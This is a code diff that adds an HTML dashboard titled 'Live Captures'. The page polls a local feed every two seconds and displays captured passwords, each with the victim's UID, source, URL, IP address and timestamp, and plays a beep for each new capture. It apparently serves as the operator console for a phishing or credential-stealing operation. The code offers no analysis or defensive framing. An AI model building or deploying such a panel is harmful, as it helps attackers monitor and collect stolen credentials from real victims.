@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Live Captures</title>
+  <style>
+    body {
+      font-family: monospace;
+      background: #0d0d0d;
+      color: #eee;
+      margin: 0;
+      padding: 16px;
+    }
+
+    h2 {
+      color: #fff;
+      margin: 0 0 12px;
+    }
+
+    .bar {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      margin-bottom: 16px;
+      font-size: 13px;
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #0f0;
+      display: inline-block;
+      animation: pulse 1.2s infinite;
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: .3;
+      }
+    }
+
+    .card {
+      background: #1a1a1a;
+      border-left: 4px solid #0f0;
+      padding: 12px;
+      margin-bottom: 10px;
+      border-radius: 6px;
+    }
+
+    .card .pass {
+      color: #ff0;
+      font-weight: bold;
+      font-size: 18px;
+    }
+
+    .card .meta {
+      color: #888;
+      font-size: 12px;
+      margin-top: 6px;
+      word-break: break-all;
+    }
+
+    .new {
+      animation: flash 1s;
+    }
+
+    @keyframes flash {
+      from {
+        background: #0a3d0a;
+      }
+
+      to {
+        background: #1a1a1a;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="bar">
+    <span class="dot"></span>
+    <b id="status">Watching live...</b>
+    <span style="color:#666">| total: <span id="total">0</span></span>
+  </div>
+  <div id="feed"></div>
+
+  <script>
+    let latest = 0;
+
+    async function poll() {
+      try {
+        const r = await fetch('/api/feed?since=' + latest);
+        const d = await r.json();
+        document.getElementById('status').textContent = 'Watching live...';
+        document.getElementById('total').textContent = d.total;
+        if (d.items.length) {
+          d.items.slice().reverse().forEach(function (c) { render(c, true); });
+          beep();
+        }
+        latest = d.latest;
+      } catch (e) {
+        document.getElementById('status').textContent = 'Reconnecting...';
+      }
+    }
+
+    function render(c, isNew) {
+      const div = document.createElement('div');
+      div.className = 'card' + (isNew ? ' new' : '');
+      div.innerHTML =
+        '<div class="pass">' + c.password + '</div>' +
+        '<div class="meta">UID: ' + c.uid + ' | SRC: ' + c.src + '<br>URL: ' + c.url + '<br>IP: ' + c.ip + '<br>' + c.time + '</div>';
+      document.getElementById('feed').prepend(div);
+    }
+
+    function beep() {
+      try {
+        const a = new (window.AudioContext || window.webkitAudioContext)();
+        const o = a.createOscillator();
+        const g = a.createGain();
+        o.connect(g); g.connect(a.destination);
+        o.frequency.value = 880;
+        o.start(); o.stop(a.currentTime + 0.15);
+      } catch (e) { }
+    }
+
+    poll();
+    setInterval(poll, 2000);
+  </script>
+</body>
+
+</html>
